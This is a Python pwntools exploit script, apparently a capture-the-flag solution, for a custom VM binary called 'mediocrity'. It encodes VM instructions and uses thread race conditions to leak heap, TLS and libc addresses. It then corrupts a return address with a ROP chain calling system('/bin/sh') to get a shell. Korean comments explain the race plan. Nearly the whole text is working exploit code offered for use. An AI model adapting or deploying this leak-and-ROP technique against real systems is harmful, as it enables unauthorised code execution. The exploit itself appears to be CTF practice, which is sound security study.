from pwn import *
#context.log_level = "debug"
p = process("./mediocrity", env={"LD_PRELOAD" : "./libc.so.6"})
libc = ELF("./libc.so.6")

ru = lambda a : p.recvuntil(a)

def mov(typ, v3, v4):
    dt = p16(9)

    if typ == "rr":
        dt += p16(0)
    elif typ == "rv":
        dt += p16(1)
    elif typ == "mr":
        dt += p16(3)
    elif typ == "rm":
        dt += p16(4)

    dt += p64(v3)
    dt += p64(v4)
    
    return dt

"""
  for ( i = 0; len / 20 > i; ++i )              // decode
  {
    inst = calloc(1uLL, 0x20uLL);
    inst->v1 = *ptr;
    ptr += 2;
    inst->v2 = *ptr;
    ptr += 2;
    inst->V3 = *ptr;
    ptr += 8;
    inst->V4 = *ptr;
    ptr += 8;
    vector_push(vector, &inst);
  }
"""
def ext(flag=0):
    dt = mov("rv", 0, 2)
    dt += mov("rv", 1, 0)
    data = p16(15)

    if(flag):
        data += p16(3)


    data += b"\x00" * (20 - len(data))
    
    dt += data

    return dt

def read(fd,buf, l, memflag=0):
    dt = mov("rv", 0, 0)
    dt += mov("rv", 1, fd)
    dt += mov("rv", 2, buf)
    dt += mov("rv", 3, l)
    
    data = p16(15)
    
    if(memflag):
        data += p16(3)


    data += b"\x00" * (20 - len(data))
    dt += data
    return dt

def write(fd, buf, l, memflag=0):
    dt = mov("rv", 0, 1)
    dt += mov("rv", 1, fd)
    dt += mov("rv", 2, buf)
    dt += mov("rv", 3, l)

    data = p16(15)

    if(memflag):
        data += p16(3)

    data += b"\x00" * (20 - len(data))
    dt += data
    return dt


def sim(dt):
   ru(b">> ")
   p.sendline(b"1")
   ru(b": ")
   p.sendline(str(len(dt)).encode()) 
   sleep(0.1)
   p.send(dt)

def cmp(typ, v1, v2):
    dt = p16(10)
    
    if typ == "rr":
        dt += p16(0)
    elif typ == "rv":
        dt += p16(1)
    elif typ == "vr":
        dt += p16(2)

    dt += p64(v1)
    dt += p64(v2)

    return dt

def jmp(pc):
    dt = p16(11)
    dt += p16(2)
    dt += p64(pc)
    dt += p64(0)
    
    return dt

def je(pc):
    dt = p16(12)
    dt += p16(2)
    dt += p64(pc)
    dt += p64(0)

    return dt

def jne(pc):
    dt = p16(13)
    dt += p16(2)
    dt += p64(pc)
    dt += p64(0)

    return dt

def thread(pc):
    dt = p16(14)
    dt += p16(2)
    dt += p64(pc)
    dt += p64(0)

    return dt   

def ret():
    dt = p16(3)
    dt += p16(1)
    dt += p64(8)
    dt += p64(0)

    return dt

def xor(reg, val):
    dt = p16(6)
    dt += p16(1)
    dt += p64(reg)
    dt += p64(val) 

    return dt


"""
0xcae : offset

스레드 1 : heap에 libc 릭용 (바로 return)
스레드 2 : write libc 릭용  --> libc 릭되는 위치 값 가져와서 계속 검사 값이 존재할 경우 출력 후 exit
스레드 3 : race condition 용 write offset 값을 지속적으로 변경

main 스레드에서는 그냥 무한 루프


write 값 검사해서 --> 값이 존재하면 릭 완료 --> 그렇지 않을 경우 계속 반복
"""


def add(reg, val):
    dt = p16(0)
    dt += p16(1)
    dt += p64(reg)
    dt += p64(val)

    return dt


"""
thread + thread + thread + jmp +ret + mov + mov + mov*4 + write + cmp + jne + mov*2 + exit  + mov + mov + xor + jmp
0        1          2       3   4     5     6     789a      b       c   d       ef      16      17 18       19  20
"""
#       ret         loop        write

pay1 = thread(4) + thread(17) + thread(5)
pay1 += jmp(3) + ret() 
pay1 += mov("rv", 0, 1) + mov("mr", 1*8, 0)
pay1 += write(1*8, 10*8, 2*8, 1) + cmp("rv", 0, 0xd18) + jne(7) + ext() 
pay1 += mov("rv", 0, 0x18) + mov("mr", 2*8, 0) +  xor(0, 0xd00) + jmp(18)



leak = 0

while True:
    sim(pay1)
    leak = p.recvuntil(b'complete\n')
    leak = leak[:-9]
    print(hex(len(leak)))
    break

tls = leak[-8:]
heap = leak[-152:]
tls = int(u64(tls))
heap = int(u64(heap[:8]))

heap_base = heap - 0x126e0
tls_base = tls + 0xa50


tls3_base = tls_base - 0x1001000 

target = tls3_base + 0x7fec90 + 0x68
libc_base = tls_base + 0x33f000

p_rdi  = 0x00173373 + libc_base
p_rsi = 0x00171ba2 + libc_base
pp_rdx = 0x00090529 + libc_base
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))


log.info("leak libc: " + hex(tls))
log.info("leak heap: " + hex(heap))
log.info("heap base: " + hex(heap_base))
log.info("tls base : " + hex(tls_base))
log.info("tls3 base: " + hex(tls3_base))
log.info("libc base: " + hex(libc_base)) 
log.info("target : " + hex(target))

"""
thread1 = 루프용 tb의 memory의 offset을 계속 바꿔줌
thread2 = read용 race하고 있는 값 가져와 state->memory 값을 function의 ret로 변조


read가 끝난 뒤 올바르게 잘 조져졌는지 검사해야됨
이를 위해 memory 인덱스 0이 0인지 검사하고 아니라면 memory가 변조되었다고 판단

"""


#gdb.attach(p, """
#set follow-fork-mode child
#b *write
#continue
#""")
#pause()

"""
thread + thread + jmp
 0          1     2

mov + mov + mov + mov
3     4     5     6

mov*4 + read + mov*4 + write + mov + cmp + je + mov*4 + read
789a    b      cdef     16     17    18    19   20      24

mov + mov + xor + jmp
25    26    27    28

"""

pay = thread(25) + thread(3) + jmp(2)
pay += mov("rv", 0, 0) + mov("mr", 0, 0) + mov("rv", 0, 8) + mov("mr", 3*8, 0)
pay += read(0, 2*8, 3*8, 1) + write(1, 0, 8) + mov("rm", 0, 0) + cmp("rv", 0, 0) + je(7) + read(0, 0, 0x100)
pay += mov("rv", 0, 0x58) + mov("mr", 2*8, 0) +  xor(0, 0xe00) + jmp(26)
sim(pay)



pay = p64(p_rdi)
pay += p64(binsh)
pay += p64(p_rsi)
pay += p64(0)
pay += p64(pp_rdx)
pay += p64(0)
pay += p64(0)
pay += p64(system)


sleep(0.1)
p.send(p64(target))
while True:
    data = p.recv(8)
    if(b'\x00' * 8 == data):
        p.send(p64(target))
    else:
        p.send(pay)
        print(data)
        break



p.interactive() 
